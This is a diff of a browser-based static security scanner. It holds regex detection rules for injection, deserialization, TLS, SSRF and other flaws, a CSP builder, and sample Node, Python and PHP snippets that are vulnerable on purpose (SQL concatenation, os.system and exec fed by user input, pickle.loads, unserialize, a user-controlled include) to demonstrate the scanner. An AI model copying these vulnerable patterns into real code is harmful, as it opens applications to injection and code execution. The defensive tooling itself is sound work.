+  fix:'Use escapeshellarg() or escapeshellcmd(), or preferably use native PHP file and network APIs.'
+ },
+ {
+  id:'sql-concat-js', sev:'high',
+  re:/(SELECT|INSERT|UPDATE|DELETE)[^;]{0,120}['"]\s*\+\s*(\w|req\.)/gi,
+  title:'SQL Injection via String Concatenation',
+  cat:'SQLi',
+  why:'Direct string concatenation allows attackers to inject SQL syntax keywords, bypassing authentication or dumping database contents.',
+  fix:'Use parameterized queries or prepared statements: db.query("SELECT * FROM users WHERE id = ?", [id]).'
+ },
+ {
+  id:'sql-python-fstring', sev:'high',
+  re:/execute\s*\(\s*f['"][^'"]*(SELECT|INSERT|UPDATE|DELETE)|execute\s*\(\s*['"][^'"]*(SELECT|INSERT|UPDATE|DELETE)[^'"]*%s['"]\s*%/gi,
+  title:'SQL Injection in Python (f-string / % format)',
+  cat:'SQLi',
+  why:'Formatting SQL queries using Python f-strings or % interpolation bypasses DB-API parameter isolation.',
+  fix:'Pass parameters as a tuple in the execute method: cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,)).'
+ },
+ {
+  id:'python-pickle', sev:'high',
+  re:/pickle\.loads?\s*\(/g,
+  title:'Insecure Deserialization (Python pickle)',
+  cat:'Deserialization',
+  why:'Python pickle can construct arbitrary objects during unpickling via __reduce__, allowing immediate arbitrary code execution.',
+  fix:'Never unpickle data from untrusted sources. Use JSON, Protocol Buffers, or cryptographically signed tokens.'
+ },
+ {
+  id:'php-unserialize', sev:'high',
+  re:/\bunserialize\s*\(/g,
+  title:'Insecure Deserialization (PHP unserialize)',
+  cat:'Deserialization',
+  why:'Unserializing untrusted objects invokes PHP magic methods (__wakeup, __destruct), triggering POP gadget chains.',
+  fix:'Use json_decode() for data exchange, or specify allowed_classes => false.'
+ },
+ {
+  id:'java-deserialization', sev:'high',
+  re:/ObjectInputStream[\s\S]{0,80}?readObject\s*\(/g,
+  title:'Insecure Native Deserialization (Java readObject)',
+  cat:'Deserialization',
+  why:'Native Java deserialization triggers gadget chains (e.g. Commons Collections) leading to remote code execution.',
+  fix:'Avoid ObjectInputStream on untrusted data. Use Jackson/Gson with strict typing or SerialFilter allowlists.'
+ },
+ {
+  id:'jwt-none-algo', sev:'high',
+  re:/algorithms?\s*[:=]\s*\[?\s*['"]none['"]/gi,
+  title:'JWT "none" Algorithm Accepted',
+  cat:'Authentication',
+  why:'Allowing the "none" algorithm allows an attacker to forge unsigned tokens with arbitrary claims.',
+  fix:'Enforce strict algorithm allowlists (e.g. algorithms: ["RS256"] or ["HS256"]).'
+ },
+ {
+  id:'hardcoded-private-key', sev:'high',
+  re:/-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g,
+  title:'Hardcoded Cryptographic Private Key',
+  cat:'Credentials',
+  why:'Private keys committed to source code can be extracted and used to decrypt traffic or impersonate servers.',
+  fix:'Store keys in a KMS (Key Management Service) or load via environment variables at runtime.'
+ },
+ {
+  id:'tls-verify-disabled', sev:'high',
+  re:/rejectUnauthorized\s*:\s*false|verify\s*=\s*False|CURLOPT_SSL_VERIFYPEER\s*,\s*false/g,
+  title:'TLS / SSL Certificate Verification Disabled',
+  cat:'Network Security',
+  why:'Disabling certificate validation enables Man-in-the-Middle (MITM) attacks and credential theft.',
+  fix:'Enable strict TLS verification; import valid enterprise or CA certificates rather than disabling checks.'
+ },
+ {
+  id:'ssti-flask', sev:'high',
+  re:/render_template_string\s*\([^)]*\+/g,
+  title:'Server-Side Template Injection (SSTI)',
+  cat:'SSTI',
+  why:'Concatenating input into render_template_string allows template sandbox escapes (Jinja2/Twig/Mako) and RCE.',
+  fix:'Pass user input as contextual template arguments: render_template_string("Hello {{ name }}", name=name).'
+ },
 
-const FRAMEWORKS=[
- ['React','Auto-escapes text in JSX','{name} in JSX renders as text, not markup. dangerouslySetInnerHTML opts back out — treat it as a deliberate, reviewed exception, ideally paired with a sanitizer library.'],
- ['Vue','Auto-escapes {{ }} interpolation','Mustache bindings escape by default. v-html renders raw markup and carries the same risk as innerHTML — only use it on content you\'ve already sanitized.'],
- ['Angular','Sanitizes bound values by default','Angular\'s built-in sanitizer strips dangerous markup from bound HTML, URLs, and styles automatically. bypassSecurityTrustHtml (and its siblings) explicitly disables that check.'],
- ['Django templates','Auto-escapes variables','{{ value }} is escaped by default. The |safe filter and {% autoescape off %} block both opt out, scoped only to what you explicitly mark.'],
- ['Rails / ERB','Auto-escapes <%= %>','Modern Rails escapes ERB output by default. raw(), .html_safe, and <%== %> all opt back into unescaped output.'],
- ['EJS (Node)','Escapes <%= %>, not <%- %>','<%= value %> HTML-escapes the value. <%- value %> renders it raw — easy to reach for by habit when the escaped form is what you actually meant.']
-];
-function buildFrameworks(){
- $('frameworkgrid').innerHTML=FRAMEWORKS.map(([t,p,d])=>
-  `<div class="refcard"><h3>${t}</h3><div class="principle">${p}</div><p>${d}</p></div>`).join('');
-}
+ /* MEDIUM SEVERITY */
+ {
+  id:'path-traversal-fs', sev:'medium',
+  re:/(fs\.readFile|fs\.createReadStream|open)\s*\(\s*(req\.|request\.args|path\.join\([^)]*req\.)/g,
+  title:'Unvalidated File Read (Path Traversal Risk)',
+  cat:'Path Traversal',
+  why:'Reading files using paths provided by client requests may allow reading system files (/etc/passwd, .env).',
+  fix:'Validate against an allowlist, use path.basename(), and verify resolved path starts with the base root.'
+ },
+ {
+  id:'yaml-unsafe-load', sev:'medium',
+  re:/yaml\.load\s*\((?!.*Loader\s*=\s*yaml\.SafeLoader)/g,
+  title:'yaml.load() without SafeLoader',
+  cat:'Deserialization',
+  why:'PyYAML default loader can instantiate arbitrary Python objects defined in the YAML document.',
+  fix:'Use yaml.safe_load(data) instead.'
+ },
+ {
+  id:'weak-hash-md5-sha1', sev:'medium',
+  re:/createHash\(\s*['"](md5|sha1)['"]\s*\)|hashlib\.(md5|sha1)\s*\(/g,
+  title:'Cryptographically Weak Hash (MD5 / SHA1)',
+  cat:'Cryptography',
+  why:'MD5 and SHA-1 suffer from collision and pre-image attacks. They are completely broken for password storage.',
+  fix:'Use SHA-256/SHA-512 for data signatures, and Argon2id, bcrypt, or scrypt for passwords.'
+ },
+ {
+  id:'deprecated-cipher', sev:'medium',
+  re:/crypto\.createCipher\s*\(/g,
+  title:'Deprecated crypto.createCipher()',
+  cat:'Cryptography',
+  why:'createCipher derives keys and IVs weakly from passphrases without salt, making ciphertexts vulnerable.',
+  fix:'Use crypto.createCipheriv() with a cryptographically generated 256-bit key and random 12-byte IV.'
+ },
+ {
+  id:'hardcoded-secret', sev:'medium',
+  re:/(api[_-]?key|secret|password|token)\s*[:=]\s*['"][A-Za-z0-9\-_]{12,}['"]/gi,
+  title:'Possible Hardcoded Secret or Token',
+  cat:'Credentials',
+  why:'Hardcoded credentials in repositories persist in version control history and cannot be safely rotated.',
+  fix:'Store secrets in environment variables (.env) or a secret manager (HashiCorp Vault, AWS Secrets Manager).'
+ },
+ {
+  id:'react-danger-html', sev:'medium',
+  re:/dangerouslySetInnerHTML/g,
+  title:'React dangerouslySetInnerHTML Used',
+  cat:'XSS',
+  why:'Explicitly disables React automatic HTML escaping, allowing injected raw markup to execute.',
+  fix:'Render as plain text where possible, or sanitize the HTML with a vetted library (e.g. DOMPurify) immediately before use.'
+ },
+ {
+  id:'cors-wildcard-origin', sev:'medium',
+  re:/Access-Control-Allow-Origin['"]?\s*[:=]\s*['"]?\*/g,
+  title:'CORS Wildcard Access-Control-Allow-Origin: *',
+  cat:'CORS',
+  why:'A wildcard origin allows any third-party website to make AJAX requests and read sensitive response payloads.',
+  fix:'Validate and echo back a verified list of trusted origins.'
+ },
+ {
+  id:'ssrf-requests', sev:'medium',
+  re:/(fetch|axios\.\w+|requests\.(get|post)|urllib\.request\.urlopen)\s*\(\s*[`'"]?\s*\$?\{?\s*(req\.|request\.)/g,
+  title:'Potential Server-Side Request Forgery (SSRF)',
+  cat:'SSRF',
+  why:'Allowing the server to fetch URLs specified by untrusted users enables attacking internal services (127.0.0.1, 169.254.169.254).',
+  fix:'Enforce an allowlist of permitted hostnames and validate that resolved IP addresses do not fall in private CIDR blocks.'
+ },
+ {
+  id:'open-redirect', sev:'medium',
+  re:/(res\.redirect|redirect)\s*\(\s*(req\.(query|body|params)|request\.(GET|args))/g,
+  title:'Unvalidated Open Redirect',
+  cat:'Open Redirect',
+  why:'Redirecting users to URLs provided directly in query parameters facilitates convincing phishing attacks.',
+  fix:'Only redirect to relative local paths (starting with /) or validate against a strict domain whitelist.'
+ },
+ {
+  id:'redos-exponential', sev:'medium',
+  re:/\(([^()]{1,30})[+*]\)[+*]/g,
+  title:'Catastrophic Backtracking Pattern (ReDoS)',
+  cat:'ReDoS',
+  why:'Nested quantifiers like (a+)+ or (x*)* cause exponential backtracking steps when evaluated against near-matching payloads.',
+  fix:'Flatten regular expressions, avoid overlapping repeated groups, or enforce input length limits before matching.'
+ },
+ {
+  id:'prototype-pollution', sev:'medium',
+  re:/__proto__|constructor\.prototype/g,
+  title:'Potential Prototype Pollution Pattern',
+  cat:'Prototype Pollution',
+  why:'Modifying Object.prototype via __proto__ changes attributes across all JavaScript objects in the runtime.',
+  fix:'Use Object.create(null), freeze object prototypes, or validate that keys do not contain "__proto__" or "constructor".'
+ },
+ {
+  id:'client-cookie-set', sev:'medium',
+  re:/document\.cookie\s*=/g,
+  title:'Client-Side Cookie Modification (document.cookie)',
+  cat:'Session',
+  why:'Cookies written via client-side JavaScript cannot have the HttpOnly flag, leaving them vulnerable to XSS theft.',
+  fix:'Issue session tokens and auth cookies from server HTTP response headers with HttpOnly, Secure, and SameSite=Lax/Strict.'
+ },
 
-const RULES=[
- {sev:'high',re:/\.innerHTML\s*=(?!=)/g,title:'Unescaped HTML sink (.innerHTML)',why:'Assigning to innerHTML with untrusted content lets injected markup and scripts execute.',fix:'Use .textContent for plain text, or escape the value before assigning innerHTML.'},
- {sev:'high',re:/document\.write\s*\(/g,title:'document.write() sink',why:'Same risk as innerHTML — writes raw markup straight into the page.',fix:'Use DOM methods (createElement / textContent) instead.'},
- {sev:'high',re:/\beval\s*\(/g,title:'eval() of dynamic content',why:'Executes a string as code — any untrusted input reaching it is arbitrary code execution.',fix:'Avoid eval entirely; use JSON.parse for data, or a real parser for expressions.'},
- {sev:'high',re:/new\s+Function\s*\(/g,title:'new Function() constructor',why:'Behaves like eval — compiles a string into executable code at runtime.',fix:'Avoid dynamic code construction; use plain functions.'},
- {sev:'high',re:/child_process\.exec\s*\(|(?<![.\w])exec\s*\(\s*[`'"][^`'"]*\$\{/g,title:'Shell command built from a string',why:'exec() runs the string through a shell that parses ; | & $ ` — untrusted input can inject additional commands.',fix:'Use execFile()/spawn() with an argument array instead of a shell string.'},
- {sev:'high',re:/os\.system\s*\(|shell\s*=\s*True/g,title:'Shell invocation (Python)',why:'os.system and subprocess with shell=True parse the string through a shell.',fix:'Use subprocess.run([...]) with a list of arguments (shell=False, the default).'},
- {sev:'high',re:/(SELECT|INSERT|UPDATE|DELETE)[^;]{0,120}['"]\s*\+\s*\w/gi,title:'SQL string built by concatenation',why:'Untrusted values folded into the query text can change the query\'s structure.',fix:'Use parameterized queries / prepared statements — pass values separately, never concatenated.'},
- {sev:'high',re:/pickle\.loads?\s*\(/g,title:'pickle deserialization',why:'Unpickling untrusted data can execute arbitrary code during deserialization.',fix:'Use a safe data format (JSON) for untrusted input, or restrict unpickling to trusted sources.'},
- {sev:'high',re:/\bunserialize\s*\(/g,title:'PHP unserialize() of untrusted data',why:'Unserializing attacker-controlled data can trigger object-injection gadgets and lead to arbitrary code execution.',fix:'Use a safe data format (JSON) for untrusted input, or restrict to trusted sources only.'},
- {sev:'high',re:/ObjectInputStream[\s\S]{0,80}?readObject\s*\(/g,title:'Java native deserialization (readObject)',why:'Deserializing untrusted bytes via ObjectInputStream can execute arbitrary code through known gadget chains.',fix:'Avoid native Java deserialization for untrusted input; use JSON, or a vetted allowlisting deserialization filter.'},
- {sev:'high',re:/algorithms?\s*[:=]\s*\[?\s*['"]none['"]/gi,title:'JWT "none" algorithm accepted',why:'Accepting the "none" algorithm lets an attacker submit an unsigned token that the verifier treats as valid.',fix:'Explicitly allowlist the expected signing algorithm(s) (e.g. RS256, HS256) and reject "none".'},
- {sev:'medium',re:/yaml\.load\s*\((?!.*Loader)/g,title:'yaml.load() without a safe loader',why:'The default loader can construct arbitrary Python objects from the YAML.',fix:'Use yaml.safe_load(), or pass Loader=yaml.SafeLoader.'},
- {sev:'medium',re:/createHash\(\s*['"](md5|sha1)['"]\s*\)|hashlib\.(md5|sha1)\s*\(/g,title:'Weak hash for a security-relevant use',why:'MD5/SHA-1 are broken for collision resistance and unsuitable for passwords.',fix:'Use SHA-256+ for integrity, and a dedicated password hash (bcrypt/argon2/scrypt) for credentials.'},
- {sev:'medium',re:/crypto\.createCipher\s*\(/g,title:'Deprecated crypto.createCipher()',why:'createCipher derives the key and IV from a passphrase in a weak, predictable way and is deprecated.',fix:'Use crypto.createCipheriv() with a properly generated key and a random, unique IV per encryption.'},
- {sev:'high',re:/rejectUnauthorized\s*:\s*false|verify\s*=\s*False/g,title:'Certificate verification disabled',why:'Disabling TLS verification allows man-in-the-middle interception.',fix:'Keep certificate verification on; fix the underlying cert/trust issue instead.'},
- {sev:'medium',re:/(api[_-]?key|secret|password|token)\s*[:=]\s*['"][A-Za-z0-9\-_]{8,}['"]/gi,title:'Possible hardcoded credential',why:'Secrets committed to source code end up in version history and are hard to rotate.',fix:'Load secrets from environment variables or a secrets manager, not source code.'},
- {sev:'medium',re:/dangerouslySetInnerHTML/g,title:'React dangerouslySetInnerHTML',why:'This bypasses React\'s automatic escaping and inserts raw markup, reopening the door to XSS.',fix:'Render as plain text where possible, or sanitize the HTML with a vetted library (e.g. DOMPurify) immediately before use.'},
- {sev:'low',re:/\|\s*safe\b|autoescape\s+false|<%-/g,title:'Template auto-escaping disabled',why:'Explicitly opting out of a template engine\'s default auto-escaping (Django |safe, Jinja2 autoescape false, EJS <%- %>) re-opens that value to XSS.',fix:'Only disable auto-escaping for content you\'ve already sanitized, and keep it scoped as narrowly as possible.'},
- {sev:'medium',re:/document\.cookie\s*=/g,title:'Cookie set from client-side JavaScript',why:'Cookies set this way can\'t carry HttpOnly (only a server response header can), so any XSS on the page can read or overwrite them.',fix:'Set sensitive cookies from the server with HttpOnly, Secure, and SameSite attributes instead of via document.cookie.'},
- {sev:'medium',re:/Access-Control-Allow-Origin['"]?\s*[:=]\s*['"]?\*/g,title:'CORS wildcard origin',why:'A wildcard Access-Control-Allow-Origin lets any website read this endpoint\'s responses from a browser.',fix:'Echo back a specific allowlisted origin per request instead of using *, especially on any endpoint that returns non-public data.'},
- {sev:'medium',re:/(fetch|axios\.\w+|requests\.(get|post))\s*\(\s*[`'"]?\s*\$?\{?\s*(req\.(query|body|params)|request\.(GET|POST|args))/g,title:'Outbound request built from user input (possible SSRF)',why:'Fetching a URL taken directly from user input lets an attacker redirect server-side requests to internal services or metadata endpoints.',fix:'Allowlist expected hosts/schemes and explicitly reject loopback, link-local, and private IP ranges before fetching.'},
- {sev:'medium',re:/res\.redirect\s*\(\s*req\.(query|body|params)/g,title:'Open redirect from user input',why:'Redirecting to a URL taken directly from user input can be used to aid phishing.',fix:'Only redirect to a known, allowlisted set of internal paths or domains.'},
- {sev:'medium',re:/\(([^()]{1,40})[+*]\)[+*]/g,title:'Possible catastrophic backtracking (ReDoS)',why:'A group with an unbounded quantifier that is itself repeated by another unbounded quantifier is the classic shape behind exponential-time regex matching on crafted input.',fix:'Rewrite to avoid nested unbounded quantifiers, cap input length before matching, or use a library with backtracking limits.'},
- {sev:'low',re:/Math\.random\s*\(\s*\)/g,title:'Math.random() is not cryptographically secure',why:'Predictable; fine for UI jitter, unsafe for tokens, IDs, or anything security-relevant.',fix:'Use crypto.getRandomValues() (browser) or crypto.randomBytes() (Node) for security-sensitive values.'}
+ /* LOW SEVERITY */
+ {
+  id:'template-autoescape-off', sev:'low',
+  re:/\|\s*safe\b|autoescape\s+false|<%-/g,
+  title:'Template Auto-Escaping Bypassed',
+  cat:'XSS',
+  why:'Manually applying filters like |safe or using <%- in EJS opts out of framework automatic XSS protection.',
+  fix:'Ensure data passed with the safe filter has been independently vetted or strictly contains sanitized markup.'
+ },
+ {
+  id:'insecure-random', sev:'low',
+  re:/Math\.random\s*\(\s*\)|random\.random\s*\(/g,
+  title:'Non-Cryptographic PRNG (Math.random)',
+  cat:'Weak PRNG',
+  why:'Standard pseudorandom generators are deterministic and predictable. Unsuitable for tokens, nonces, or reset keys.',
+  fix:'Use window.crypto.getRandomValues() in the browser, crypto.randomBytes() in Node.js, or secrets in Python.'
+ },
+ {
+  id:'csrf-protection-disabled', sev:'low',
+  re:/@csrf_exempt|csrf\s*:\s*false/g,
+  title:'CSRF Protection Explicitly Disabled',
+  cat:'CSRF',
+  why:'Bypassing CSRF verification allows third-party websites to perform state-changing operations on behalf of authenticated users.',
+  fix:'Require CSRF tokens on all POST/PUT/DELETE requests or enforce strict SameSite cookies.'
+ }
 ];
-const SEV_ORDER={high:0,medium:1,low:2};
+
+const SEV_WEIGHT = { high: 3, medium: 2, low: 1 };
+
+let currentFindings = [];
+let activeFilter = 'all';
+
 function scan(){
- const text=$('scanIn').value;
- if(!text.trim()){ $('scanCount').textContent='0'; $('scanResults').innerHTML=''; return; }
- let findings=[];
- RULES.forEach(r=>{
-  r.re.lastIndex=0;
-  let m, guard=0;
-  while((m=r.re.exec(text))){
-   const lineNo=text.slice(0,m.index).split('\n').length;
-   findings.push({...r,line:lineNo});
-   if(m[0].length===0) r.re.lastIndex++;
-   if(++guard>500) break;
+ const text = $('scanIn').value;
+ if(!text.trim()){
+  $('scanCount').textContent = '0';
+  $('scanHighCount').textContent = '0';
+  $('scanMedCount').textContent = '0';
+  $('scanLowCount').textContent = '0';
+  $('scanResults').innerHTML = '';
+  currentFindings = [];
+  return;
+ }
+
+ const lines = text.split('\n');
+ let findings = [];
+
+ RULES.forEach(rule => {
+  const flags = rule.re.flags.includes('g') ? rule.re.flags : rule.re.flags + 'g';
+  const re = new RegExp(rule.re.source, flags);
+
+  let m;
+  let guard = 0;
+  while((m = re.exec(text))){
+   const matchIdx = m.index;
+   const lineNo = text.slice(0, matchIdx).split('\n').length;
+   const lineContent = lines[lineNo - 1] || '';
+
+   findings.push({
+    ...rule,
+    line: lineNo,
+    matchedText: m[0],
+    codeSnippet: lineContent
+   });
+
+   if(m[0].length === 0) re.lastIndex++;
+   if(++guard > 500) break;
   }
  });
- findings.sort((a,b)=>SEV_ORDER[a.sev]-SEV_ORDER[b.sev]||a.line-b.line);
- $('scanCount').textContent=findings.length;
- $('scanResults').innerHTML = findings.length ? findings.map(f=>{
-  const bg=f.sev==='high'?'var(--danger-bg)':f.sev==='medium'?'var(--warn-bg)':'var(--paper2)';
-  const fg=f.sev==='high'?'var(--danger)':f.sev==='medium'?'var(--warn)':'var(--muted)';
-  return `<div class="findcard">
-   <div class="findhead">
-    <h3>${escapeHtml(f.title)}</h3>
-    <span class="badge" style="background:${bg};color:${fg}">line ${f.line} · ${f.sev}</span>
-   </div>
-   <p style="color:var(--muted);font-size:13px;margin:8px 0 0">${escapeHtml(f.why)}</p>
-   <div class="explain" style="margin-top:8px"><b>Fix:</b> ${escapeHtml(f.fix)}</div>
-  </div>`;
- }).join('') : '<div class="findcard" style="color:var(--muted)">No matches from the current rule set — this is a heuristic pass, not a guarantee, and won\'t catch everything.</div>';
+
+ findings.sort((a,b) => SEV_WEIGHT[b.sev] - SEV_WEIGHT[a.sev] || a.line - b.line);
+ currentFindings = findings;
+
+ const high = findings.filter(f=>f.sev==='high').length;
+ const med = findings.filter(f=>f.sev==='medium').length;
+ const low = findings.filter(f=>f.sev==='low').length;
+
+ $('scanCount').textContent = findings.length;
+ $('scanHighCount').textContent = high;
+ $('scanMedCount').textContent = med;
+ $('scanLowCount').textContent = low;
+
+ renderFindings();
 }
 
-const CSP_OPTS=[
- {id:'images',label:'Allow images',sub:'self origin + data: URIs',def:true},
- {id:'fonts',label:'Allow fonts',sub:'same origin only',def:true},
- {id:'media',label:'Allow audio/video',sub:'same origin only',def:false},
- {id:'workers',label:'Allow web workers',sub:'same origin only',def:false},
- {id:'inlineStyles',label:'Allow inline styles',sub:"adds 'unsafe-inline' — weakens the policy",def:false},
- {id:'nonceScripts',label:'Allow inline scripts via nonce',sub:'server must generate a fresh nonce per request',def:false},
- {id:'frameAncestors',label:'Block framing',sub:'clickjacking protection',def:true},
- {id:'upgrade',label:'Upgrade insecure requests',sub:'auto-upgrade http:// to https://',def:true}
-];
-function buildCspUI(){
- $('cspOpts').innerHTML=CSP_OPTS.map(o=>
-  `<label class="cspopt"><input type="checkbox" id="csp_${o.id}" ${o.def?'checked':''} onchange="buildCSP()" style="margin-top:2px">
-   <span>${o.label}<small>${o.sub}</small></span></label>`).join('');
+function filterFindings(sev, btn){
+ activeFilter = sev;
+ document.querySelectorAll('.filter-tab').forEach(t=>t.classList.remove('active'));
+ btn.classList.add('active');
+ renderFindings();
 }
-function parseExtraSources(raw){
+
+function renderFindings(){
+ const container = $('scanResults');
+ if(!currentFindings.length){
+  container.innerHTML = '<div class="findcard" style="color:var(--muted);text-align:center;padding:24px">No security findings detected with current heuristics. Great work!</div>';
+  return;
+ }
+
+ const filtered = activeFilter === 'all'
+  ? currentFindings
+  : currentFindings.filter(f => f.sev === activeFilter);
+
+ if(!filtered.length){
+  container.innerHTML = `<div class="findcard" style="color:var(--muted);text-align:center;padding:24px">No findings in the <b>${activeFilter}</b> severity tier.</div>`;
+  return;
+ }
+
+ container.innerHTML = filtered.map(f => {
+  const bg = f.sev === 'high' ? 'var(--danger-bg)' : f.sev === 'medium' ? 'var(--warn-bg)' : 'var(--info-bg)';
+  const fg = f.sev === 'high' ? 'var(--danger)' : f.sev === 'medium' ? 'var(--warn)' : 'var(--info)';
+
+  let highlightedSnippet = escapeHtml(f.codeSnippet.trim());
+  if(f.matchedText && f.codeSnippet.includes(f.matchedText)){
+   const escapedMatch = escapeHtml(f.matchedText);
+   highlightedSnippet = highlightedSnippet.replace(escapedMatch, `<mark>${escapedMatch}</mark>`);
+  }
+
+  return `
+  <div class="findcard ${f.sev}">
+   <div class="findhead">
+    <h3>
+     <span>${escapeHtml(f.title)}</span>
+     <span style="font-size:11px;font-family:'IBM Plex Mono';color:var(--muted)">[${f.cat}]</span>
+    </h3>
+    <span class="badge" style="background:${bg};color:${fg}">
+     Line ${f.line} · ${f.sev.toUpperCase()}
+    </span>
+   </div>
+   <p style="color:var(--muted);font-size:13px;margin:6px 0 8px">${escapeHtml(f.why)}</p>
+
+   <div class="code-preview">
+    <span class="line-num">${f.line}:</span>${highlightedSnippet}
+   </div>
+
+   <div class="explain" style="margin-top:10px;font-size:12.5px">
+    <b>Recommended Remediation:</b> ${escapeHtml(f.fix)}
+   </div>
+  </div>`;
+ }).join('');
+}
+
+function exportReport(){
+ if(!currentFindings.length){
+  showToast('No findings to export');
+  return;
+ }
+ let md = `# Static Security Scan Report\n\n`;
+ md += `**Generated**: ${new Date().toISOString()}\n`;
+ md += `**Total Findings**: ${currentFindings.length}\n\n`;
+
+ currentFindings.forEach((f, idx) => {
+  md += `### ${idx+1}. [${f.sev.toUpperCase()}] ${f.title}\n`;
+  md += `- **Category**: ${f.cat}\n`;
+  md += `- **Location**: Line ${f.line}\n`;
+  md += `- **Code Context**:\n\`\`\`\n${f.codeSnippet.trim()}\n\`\`\`\n`;
+  md += `- **Risk**: ${f.why}\n`;
+  md += `- **Remediation**: ${f.fix}\n\n`;
+ });
+
+ fallbackCopy(md, (ok)=>{
+  showToast(ok ? 'Report copied as Markdown!' : 'Export failed');
+ });
+}
+
+/* ==================== SAMPLE SNIPPETS ==================== */
+const SAMPLES = {
+ node:`const express = require('express');
+const app = express();
+const cp = require('child_process');
+const mysql = require('mysql');
+
+app.get('/search', (req, res) => {
+  // Vulnerable SQL concatenation
+  const query = "SELECT * FROM items WHERE name = '" + req.query.q + "'";
+  mysql.query(query, (err, rows) => {
+    // Vulnerable innerHTML sink
+    document.getElementById('results').innerHTML = "Found: " + req.query.q;
+  });
+});
+
+app.post('/compress', (req, res) => {
+  // Command Injection
+  cp.exec(\`tar -czf output.tar.gz \${req.body.filename}\`);
+});
+
+// Dangerous secret in code
+const JWT_SECRET = "super_secret_jwt_key_12345";
+app.use((req, res, next) => {
+  res.setHeader("Access-Control-Allow-Origin", "*");
+});`,
+
+ python:`import os
+import pickle
+import hashlib
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/unpickle', methods=['POST'])
+def load_data():
+    raw_data = request.get_data()
+    # Insecure Deserialization
+    obj = pickle.loads(raw_data)
+    return "Loaded"
+
+@app.route('/render')
+def show_page():
+    user = request.args.get('name', '')
+    # Server-Side Template Injection (SSTI)
+    template = f"<h1>Welcome {user}!</h1>"
+    return render_template_string(template)
+
+@app.route('/system')
+def run_command():
+    tool = request.args.get('cmd')
+    # Command Injection
+    os.system("ping -c 1 " + tool)
+    return "Done"
+
+def hash_password(password):
+    # Weak MD5 hash
+    return hashlib.md5(password.encode()).hexdigest()`,
+
+ php:`<?php
+$conn = mysqli_connect("localhost", "root", "password", "test");
+
+// SQL Injection
+$user_id = $_GET['id'];
+$result = mysqli_query($conn, "SELECT * FROM accounts WHERE id = " . $user_id);
+
+// Command Injection
+$target = $_POST['ip'];
+system("traceroute " . $target);
+
+// Insecure Deserialization
+$cookie_data = $_COOKIE['user_profile'];
+$user = unserialize($cookie_data);
+
+// Path traversal
+include("pages/" . $_GET['page']);
+?>`,
+
+ secure:`const express = require('express');
+const app = express();
+const { execFile } = require('child_process');
+const pool = require('./db');
+const DOMPurify = require('dompurify');
+
+app.get('/search', async (req, res) => {
+  const searchTerm = String(req.query.q || '');
+  // Parameterized query prevents SQL Injection
+  const [rows] = await pool.query('SELECT * FROM items WHERE name = ?', [searchTerm]);
+  res.json({ items: rows });
+});
+
+app.post('/compress', (req, res) => {
+  const filename = path.basename(req.body.filename);
+  // execFile with arguments array prevents shell command injection
+  execFile('tar', ['-czf', 'output.tar.gz', filename], (error) => {
+    if (error) return res.status(500).send('Error');
+    res.send('Success');
+  });
+});`
+};
+
+function loadSample(type){
+ if(SAMPLES[type]){
+  $('scanIn').value = SAMPLES[type];
+  scan();
+  showToast(`Loaded ${type} sample`);
+ }
+}
+
+/* ==================== ADVANCED CSP BUILDER ==================== */
+const CSP_OPTS = [
+ { id:'images', label:'Allow Images (img-src)', sub:"'self' + data: URIs + https:", def:true },
+ { id:'fonts', label:'Allow Web Fonts (font-src)', sub:"'self' + data:", def:true },
+ { id:'media', label:'Allow Media (media-src)', sub:"Audio & Video ('self')", def:false },
+ { id:'connect', label:'Allow Network Fetch (connect-src)', sub:"APIs & WebSockets ('self')", def:true },
+ { id:'inlineStyles', label:'Allow Inline Styles', sub:"Adds 'unsafe-inline' (weakens CSS security)", def:false },
+ { id:'nonceScripts', label:'Require Dynamic Nonce for Scripts', sub:"Adds 'nonce-<generated>'", def:false },
+ { id:'evalScripts', label:'Allow eval() in Scripts', sub:"Adds 'unsafe-eval' (NOT recommended)", def:false },
+ { id:'frameAncestors', label:'Prevent Clickjacking (frame-ancestors)', sub:"Restricts framing to 'none'", def:true },
+ { id:'upgrade', label:'Upgrade Insecure Requests', sub:"Forces all http:// requests to https://", def:true }
+];
+
+function buildCspUI(){
+ $('cspOpts').innerHTML = CSP_OPTS.map(o =>
+  `<label class="cspopt">
+    <input type="checkbox" id="csp_${o.id}" ${o.def ? 'checked' : ''} onchange="buildCSP()" style="margin-top:2px">
+    <span>${o.label}<small>${o.sub}</small></span>
+   </label>`).join('');
+}
+
+function parseHostList(raw){
  return raw.split(/[\s,]+/).map(s=>s.trim()).filter(Boolean);
 }
-function isValidSource(s){
- return /^(https?:\/\/[a-zA-Z0-9.-]+(:\d+)?(\/[^\s]*)?|'self'|'none'|'unsafe-inline'|'unsafe-eval'|data:|blob:)$/.test(s);
-}
-function buildCSP(){
- const get=id=>$('csp_'+id)?.checked;
- const extras=parseExtraSources($('cspExtra').value.trim());
- const validExtras=extras.filter(isValidSource);
- const invalidExtras=extras.filter(s=>!isValidSource(s));
 
- let d=[];
+function isValidCspSource(s){
+ return /^(\*|https?:\/\/[a-zA-Z0-9.\-_*]+(:\d+)?(\/[^\s]*)?|wss?:\/\/[a-zA-Z0-9.\-_*]+(:\d+)?(\/[^\s]*)?|\*\.[a-zA-Z0-9.\-_]+|'self'|'none'|'unsafe-inline'|'unsafe-eval'|'strict-dynamic'|data:|blob:)$/.test(s);
+}
+
+function applyCspPreset(type){
+ if(type === 'strict'){
+  $('csp_images').checked = true;
+  $('csp_fonts').checked = false;
+  $('csp_media').checked = false;
+  $('csp_connect').checked = true;
+  $('csp_inlineStyles').checked = false;
+  $('csp_nonceScripts').checked = true;
+  $('csp_evalScripts').checked = false;
+  $('csp_frameAncestors').checked = true;
+  $('csp_upgrade').checked = true;
+  $('cspExtra').value = '';
+  $('cspConnect').value = '';
+ } else if(type === 'spa'){
+  $('csp_images').checked = true;
+  $('csp_fonts').checked = true;
+  $('csp_media').checked = false;
+  $('csp_connect').checked = true;
+  $('csp_inlineStyles').checked = true;
+  $('csp_nonceScripts').checked = false;
+  $('csp_evalScripts').checked = false;
+  $('csp_frameAncestors').checked = true;
+  $('csp_upgrade').checked = true;
+  $('cspExtra').value = 'https://cdnjs.cloudflare.com';
+  $('cspConnect').value = 'https://api.example.com';
+ } else if(type === 'permissive'){
+  $('csp_images').checked = true;
+  $('csp_fonts').checked = true;
+  $('csp_media').checked = true;
+  $('csp_connect').checked = true;
+  $('csp_inlineStyles').checked = true;
+  $('csp_nonceScripts').checked = false;
